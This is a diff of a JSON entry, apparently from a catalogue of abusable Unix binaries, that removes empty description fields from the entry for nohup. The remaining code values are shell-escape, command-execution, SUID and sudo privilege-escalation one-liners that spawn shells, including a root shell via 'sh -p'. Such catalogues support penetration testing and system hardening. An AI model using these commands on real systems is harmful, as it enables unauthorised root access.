@@ -2,25 +2,25 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"\n"
       }
     ],
     "command": [
       {
-        "description": "",
+        
         "code": "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"\n"
       }
     ]
